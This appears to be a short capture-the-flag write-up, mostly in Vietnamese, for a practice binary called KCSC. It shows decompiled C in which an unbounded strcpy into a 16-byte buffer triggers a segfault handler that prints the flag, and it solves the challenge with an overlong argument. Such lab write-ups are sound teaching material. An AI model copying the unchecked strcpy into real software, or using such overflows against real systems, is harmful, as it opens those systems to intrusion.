# KCSC
## Pseudo code
```sh
main function

int __cdecl main(int argc, const char **argv, const char **envp)
{
  __gid_t rgid; // [rsp+14h] [rbp-Ch]
  FILE *stream; // [rsp+18h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts(
      "Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.");
    exit(0);
  }
  fgets(flag, 64, stream);
  signal(11, (__sighandler_t)sigsegv_handler);
  rgid = getegid();
  setresgid(rgid, rgid, rgid);
  if ( argc > 1 )
  {
    vuln(argv[1]);
    printf("Thanks! Received: %s\n", argv[1]);
  }
  else
  {
    puts("This program takes 1 argument.");
  }
  return 0;
}
--------------------------------------------------------------------------
sigsegv_handler function

void __noreturn sigsegv_handler()
{
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}
--------------------------------------------------------------------------

vuln function

char *__fastcall vuln(const char *a1)
{
  char dest[16]; // [rsp+10h] [rbp-10h] BYREF

  return strcpy(dest, a1);
}

```

Bài này lỗi ngay hàm `strcpy(dest,a1)` vì nó không có giới bạn số lượng copy nên chúng ta sẽ tràn làm sao để kích hoạt `sigsegv_handler function` thế là xong bài này.

Chúng ta chỉ cần truyền vào 1 chuỗi có kích thước lớn hơn dest để kích hoạt segsegv_handler thì chương trình sẽ cho ta flag thôi. :3

Mình debug lúc ở local
```sh
zir@HAZIR:~/Desktop$ ./kcsc aloaloaloaloaloalaoa
Zir{This_is_flag}
```

Còn khi netcat tới server thì sẽ cho mình nhập tham số. Truyền vào tương tự sẽ ra được flag. :3
